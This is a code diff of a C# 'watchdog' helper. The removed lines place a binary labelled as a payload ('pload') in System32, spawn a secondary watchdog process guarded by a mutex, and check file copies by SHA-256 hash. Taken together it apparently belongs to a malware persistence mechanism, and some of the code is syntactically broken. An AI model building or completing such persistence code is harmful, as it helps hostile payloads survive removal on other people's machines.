@@ -1,13 +1,6 @@
 namespace watchdogHelper{
     public class watchDogHelper{
 
-    // Defaults to putting the file in the System32 directory and the binary name pload
-    static string binaryPath = @"C:\\Windows\System32"; //payload
-    static string binaryName = @"pload";
-    static string secondaryWatchdogPath = @"C:\\Windows\System32"
-    static string secondaryWatchdogName = "Wdog2"; //used for the secondary watchdog process that is spawned
-    static string secondaryWatchdogMutexName = "SecondaryWDog"
-
     static bool IsMutexRunning(string mutexName)
     {
         bool isNewInstance;
@@ -62,7 +55,7 @@ namespace watchdogHelper{
         string destPathBinary = Path.Combine(destinationPath, name);
 
 
-        if(File.Exists(destPathBinary) && File.Exists(sourcePath) && CompareFileHashes(destinationPath, sourcePath)){
+        if(File.Exists(destPathBinary) && File.Exists(sourcePath)){
             return;
         } 
         else{
@@ -99,33 +92,6 @@ namespace watchdogHelper{
         else
         {
             Console.WriteLine($"'{binaryName}' not found in the current directory.");
-        }
-    }
-
-    public static bool CompareFileHashes(string filePath1, string filePath2)
-    {
-        try
-        {
-            // Calculate the hash of each file
-            byte[] hash1 = ComputeFileHash(filePath1);
-            byte[] hash2 = ComputeFileHash(filePath2);
-
-            // Compare the two hashes
-            return StructuralComparisons.StructuralEqualityComparer.Equals(hash1, hash2);
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Error comparing files: {ex.Message}");
-            return false;
-        }
-    }
-
-    private static byte[] ComputeFileHash(string filePath)
-    {
-        using (FileStream stream = File.OpenRead(filePath))
-        using (SHA256 sha256 = SHA256.Create())
-        {
-            return sha256.ComputeHash(stream);
         }
     }
 
@@ -209,6 +175,5 @@ namespace watchdogHelper{
             Console.WriteLine($"Error loading config: {ex.Message}");
         }
     }
-
     }
 }
